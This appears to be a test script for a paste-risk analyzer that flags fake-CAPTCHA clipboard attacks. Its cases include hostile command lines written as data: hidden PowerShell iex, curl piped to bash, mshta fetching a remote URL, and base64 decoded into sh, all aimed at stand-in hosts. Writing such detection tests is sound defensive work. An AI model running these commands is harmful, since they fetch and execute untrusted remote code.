// Run: node test-analyzer.js
const { analyze } = require("./src/analyzer.js");
const cases = [
  ["hello world", "LOW"],
  ["npm install left-pad", "LOW"],
  ['powershell -WindowStyle Hidden -Command "iex \'x\'"   # I am not a robot', "HIGH"],
  ["curl http://example.invalid/x.sh | bash", "HIGH"],
  ["mshta https://example.invalid/a", "HIGH"],
  ["echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8= | base64 -d | sh", "HIGH"],
  ["Press Win+R then Ctrl+V to verify you are human", "MEDIUM"],
];
let bad = 0;
for (const [t, want] of cases) {
  const r = analyze(t);
  const ok = r.risk === want; if (!ok) bad++;
  console.log(ok ? "PASS" : "FAIL", want.padEnd(6), r.risk.padEnd(6), r.score, JSON.stringify(t.slice(0, 50)));
}
process.exit(bad ? 1 : 0);
